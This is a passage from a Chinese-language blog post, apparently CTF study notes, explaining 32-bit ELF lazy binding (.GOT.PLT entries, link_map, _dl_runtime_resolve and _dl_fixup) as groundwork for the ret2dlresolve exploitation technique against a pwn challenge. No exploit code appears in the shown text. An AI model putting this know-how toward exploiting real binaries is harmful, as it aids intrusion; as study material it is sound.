class="number">25</span> completed<span class="number">.7283</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">08049f</span>10     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __do_global_dtors_aux_fin</span><br><span class="line">    <span class="number">38</span>: <span class="number">08048420</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> frame_dummy</span><br><span class="line">    <span class="number">39</span>: <span class="number">08049f</span>0c     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">19</span> __frame_dummy_init_array_</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS test.c</span><br><span class="line">	...</span><br><span class="line">    <span class="number">66</span>: <span class="number">08048426</span>    <span class="number">64</span> FUNC    GLOBAL DEFAULT   <span class="number">14</span> main</span><br><span class="line">    <span class="number">67</span>: <span class="number">08048466</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">68</span>: <span class="number">0804</span>a01c     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">24</span> __TMC_END__</span><br><span class="line">    <span class="number">69</span>: <span class="number">080482</span>ac     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">11</span> _init</span><br></pre></td></tr></table></figure>

<p>readelf -s会读取两个表,一个是本地符号表symtab,一个是链接符号表.dynsym</p>
<p>这个symtab可以strip掉,不影响程序执行</p>
<p>而实际上这两个符号表的表项中并没有Name数组,st_name是一个索引,索引字符串表.strtab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1C7Ch: 00 63 72 74 73 74 75 66 66 2E 63 00 64 65 72 65  .crtstuff.c.dere </span><br><span class="line">1C8Ch: 67 69 73 74 65 72 5F 74 6D 5F 63 6C 6F 6E 65 73  gister_tm_clones </span><br><span class="line">1C9Ch: 00 5F 5F 64 6F 5F 67 6C 6F 62 61 6C 5F 64 74 6F  .__do_global_dto </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>比如crtstuff.c的符号表项Elf32_Sym中,st_name&#x3D;1,对应0x1c7c+1</p>
<p>比如deregister_tm_clones的符号表项Elf32_Sym中,st_name&#x3D;c,对应0x1c7c+c</p>
<p>这里0x1c7c是.strtab节在文件中的偏移量,可以使用readelf -S查看对应节区</p>
</blockquote>
<h4 id="GOT-PLT-1-link-map-ld"><a href="#GOT-PLT-1-link-map-ld" class="headerlink" title=".GOT.PLT[1]&#x3D;link_map @ ld"></a>.GOT.PLT[1]&#x3D;link_map @ ld</h4><p>.GOT.PLT[1]和.GOT.PLT[2]在编译链接时无法决定是啥，只有在运行时才会知道是什么</p>
<p>.GOT.PLT[1]用于存放<strong>主模块的</strong>link_map数据结构的地址</p>
<p>每个模块(主模块以及所有加载的动态库)都各自有一个link_map</p>
<p>这个link_map保存了对应模块的诸多信息,比如各个节区的地址,elf头的地址,模块名等</p>
<h4 id="GOT-PLT-2-dl-runtime-resolve-ld"><a href="#GOT-PLT-2-dl-runtime-resolve-ld" class="headerlink" title=".GOT.PLT[2]&#x3D;dl_runtime_resolve @ ld"></a>.GOT.PLT[2]&#x3D;dl_runtime_resolve @ ld</h4><p>存放dl_runtime_resolve的地址</p>
<h4 id="GOT-PLT-3"><a href="#GOT-PLT-3" class="headerlink" title=".GOT.PLT[3+]"></a>.GOT.PLT[3+]</h4><p>第四项及之后,该表用于保存函数的虚拟地址</p>
<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>每个函数的plt表都有三项</p>
<p>jmp</p>
<p>push</p>
<p>jmp</p>
<p>这里第一个jmp调试观察是到push这行</p>
<p>第二个jmp是到dl_runtime_resolve函数中</p>
<p>那么中间push了什么呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//____libc_start_main</span><br><span class="line">.plt:080482E0 FF 25 0C A0 04 08                             jmp     ds:off_804A00C</span><br><span class="line">.plt:080482E6 68 00 00 00 00                                push    0</span><br><span class="line">.plt:080482EB E9 E0 FF FF FF                                jmp     sub_80482D0</span><br><span class="line"></span><br><span class="line">//write</span><br><span class="line">.plt:080482F0 FF 25 10 A0 04 08                             jmp     ds:off_804A010</span><br><span class="line">.plt:080482F6 68 08 00 00 00                                push    8</span><br><span class="line">.plt:080482FB E9 D0 FF FF FF                                jmp     sub_80482D0</span><br></pre></td></tr></table></figure>

<p>符号又到底是如何解析并且回填到GOT表的呢?</p>
<p>为了解决这些问题,以及学习ret2dlresolve的原理,</p>
<p>下面我们阅读<code>_dl_fixup</code>的源码寻找答案</p>
<h2 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h2><p>以write为例，观察该符号是如何解析的</p>
<p>解析符号发生在<code>_dl_fixup</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>

<p>该函数有两个参数，其中<code>link_map *l</code>参数就是<code>.got.plt[1]</code>,</p>
<p>参数reloc_arg是目标函数在.rel.plt中的偏移量</p>
<p>reloc_arg在write@plt中被压入栈中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80483a0</span> &lt;write@plt&gt;:       jmp    DWORD PTR ds:<span class="number">0x80498d4</span></span><br><span class="line"><span class="number">0x80483a6</span> &lt;write@plt+<span class="number">6</span>&gt;:     push   <span class="number">0x20</span></span><br><span class="line"><span class="number">0x80483ab</span> &lt;write@plt+<span class="number">11</span>&gt;:    jmp    <span class="number">0x8048350</span></span><br></pre></td></tr></table></figure>

<p>然后跳转到<code>plt[0]=0x8048350</code>，这是<code>_dl_runtime_resolve</code>的导火索，在这里首先将<code>link_map *l</code>压入栈中,然后跳转_<code>dl_runtime_resolve</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x8048350</span>                              push   dword ptr [<span class="number">0x80498bc</span>]</span><br><span class="line">  <span class="number">0x8048356</span>                              jmp    dword ptr [<span class="number">0x80498c0</span>]       &lt;_dl_runtime_resolve&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>_dl_runtime_resolve</code>中,这两个参数又改用<code>eax(link_map *l)</code>和<code>edx(reloc_arg)</code>传递,稍微违背了x86调用约定,但是问题不大</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">	_CET_ENDBR</span><br><span class="line">	pushl %eax		# Preserve registers otherwise clobbered.</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">	pushl %ecx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	pushl %edx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	movl 16<span class="params">(%esp)</span>, %edx	# Copy args pushed by PLT in <span class="keyword">register</span>.  Note</span><br><span class="line">	movl 12<span class="params">(%esp)</span>, %eax	<span class="meta"># that `fixup<span class="string">&#x27; takes its parameters in regs.</span></span></span><br><span class="line"><span class="string"><span class="meta">	call _dl_fixup		# Call resolver.</span></span></span><br></pre></td></tr></table></figure>



<p><code>_dl_runtime_resolve</code>实际上只是一个包装函数,实际工作是<code>_dl_fixup</code>完成的</p>
<p><code>_dl_fixup</code>干了啥呢?</p>
<p><code>_dl_fixup</code>知道两件事,</p>
<p>一个是主程序模块的<code>link_map</code>,这玩意儿保存了很多信息,包括它属于哪个模块,该模块的elf信息等等</p>
<p>一个进程所有模块的<code>link_map</code>以双向链表连接</p>
<blockquote>
<p>每个模块(主程序和每个so库)各自有一个link_map</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/s l.l_name</span><br><span class="line">$<span class="number">8</span> = <span class="number">0xf7ffdd2c</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_name</span><br><span class="line">$<span class="number">9</span> = <span class="number">0xf7fc828c</span> <span class="string">&quot;linux-gate.so.1&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_name</span><br><span class="line">$<span class="number">10</span> = <span class="number">0xf7fc2390</span> <span class="string">&quot;/home/glibc32/lib/libc.so.6&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_name</span><br><span class="line">$<span class="number">11</span> = <span class="number">0x8046174</span> <span class="string">&quot;/home/glibc32/lib/ld-linux.so.2&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_next.l_name</span><br><span class="line">Cannot access memory at address <span class="number">0x4</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>另一个就是reloc_arg,也就是他要解析的函数符号,在.rel.plt节区中的偏移</p>
<p>显然抛开基地址谈偏移量是没有意义的,因此下面要做的第一件事是找到.rel.plt的基地址</p>
<p>怎么找呢?</p>
<p>大体步骤如下伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1.找到dynamic节,1-&gt;1l_info就是dynamic节,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到.rel.plt节记为reloc</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到符号表symtab,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到字符串表strtab</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 2.使用reloc_arg配合reloc表找到该表中的具体项目Elf32_Rel</span></span><br><span class="line">    <span class="comment">//        typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr  r_offset;       //符号要填充的got表项的虚拟地址</span></span><br><span class="line">    <span class="comment">//            Elf32_Word  r_info;         //符号在符号表中的下标</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Rel;</span></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 3.找到符号表对应表项</span></span><br><span class="line">    <span class="comment">//        typedef struct &#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_name;	//符号名字符串在字符串表中的偏移</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr	st_value;	//符号在其所在模块中的偏移量</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_size;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_info;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_other;</span></span><br><span class="line">    <span class="comment">//            Elf32_Half	st_shndx;</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Sym;</span></span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 4.解析符号</span></span><br><span class="line">    <span class="comment">//从strtab偏移Elf32_Sym.st_name处找到符号名,</span></span><br><span class="line">    <span class="comment">//从链表相接的各个模块的link_map入手,遍历各个模块,寻找该符号名,如果找到,result返回对应模块的link_map</span></span><br><span class="line">    <span class="comment">//同时sym废物利用,从对应模块的符号表中抄了同名的符号过来,但是这个符号是有虚拟地址的</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// result中保存着目标模块的基地址,加上目标符号的偏移量,得到该符号纯纯的虚拟地址,放到value里</span></span><br><span class="line">    <span class="comment">// 这里DL_FIXUP_MAKE_VALUE(map,addr) = addr,纯纯弱智</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5.回写GOT表</span></span><br><span class="line">    <span class="comment">//最后把value写入相应的GOT表条目中,rel_addr就是GOT地址</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在图上意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png" alt="image-20240819193758449"></p>
<p>下面详细说明每一步</p>
<h3 id="1-由主模块link-map找dynamic节"><a href="#1-由主模块link-map找dynamic节" class="headerlink" title="1.由主模块link_map找dynamic节"></a>1.由主模块link_map找dynamic节</h3><p>这个<code>link_map</code>中有一个成员叫<code>l_info</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.		dynamic节的索引指针</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">   	...</span><br></pre></td></tr></table></figure>

<p><code>l_info</code>的类型是<code>ElfW(Dyn)**</code>,也就是<code>Elf32_Dyn**</code>，这是一个二级指针，或者说数组指针</p>
<p>意思是在内存某个地方有一个<code>dynamic</code>数组，然后这个指针指向数组的基地址</p>
<p>在运行时<code>l_info</code>指向所在模块的的<code>dynamic</code>节</p>
<p><code>dynamic</code>节加载进入内存的地址是确定的，比如本程序中在<code>0x080497c4</code>,可以使用<code>readelf -S</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -S main_no_relro_32</span></span><br><span class="line">There are <span class="number">30</span> section headers, starting at offset <span class="number">0x10b0</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>在<code>GOT.PLT</code>表的最头部,也保存着一个<code>_DYNAMIC</code>的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GOT.PLT[0] =&gt; _DYNAMIC</span><br><span class="line">GOT.PLT[1] =&gt; link_map</span><br><span class="line">GOT.PLT[2] =&gt; dl_runtime_resolve</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>dynamic节中的内容可以用<code>readelf -d</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -d main_no_relro_32</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0x7c4</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x804832c</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x8048634</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x80497bc</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x80497c0</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x804818c</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804824c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">107</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x80498b8</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">40</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048304</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x80482ec</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x80482cc</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x80482b8</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080497C4 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:080497C4                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:080497C4                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:080497CC                 Elf32_Dyn &lt;0Ch, &lt;804832Ch&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:080497D4                 Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:080497DC                 Elf32_Dyn &lt;19h, &lt;80497BCh&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:080497E4                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:080497EC                 Elf32_Dyn &lt;1Ah, &lt;80497C0h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:080497F4                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:080497FC                 Elf32_Dyn &lt;6FFFFEF5h, &lt;804818Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049804                 Elf32_Dyn &lt;5, &lt;804824Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:0804980C                 Elf32_Dyn &lt;6, &lt;80481ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049814                 Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:0804981C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049824                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:0804982C                 Elf32_Dyn &lt;3, &lt;80498B8h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049834                 Elf32_Dyn &lt;2, &lt;28h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:0804983C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049844                 Elf32_Dyn &lt;17h, &lt;8048304h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0804984C                 Elf32_Dyn &lt;11h, &lt;80482ECh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049854                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:0804985C                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049864                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482CCh&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0804986C                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049874                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482B8h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0804987C                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype Elf32_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



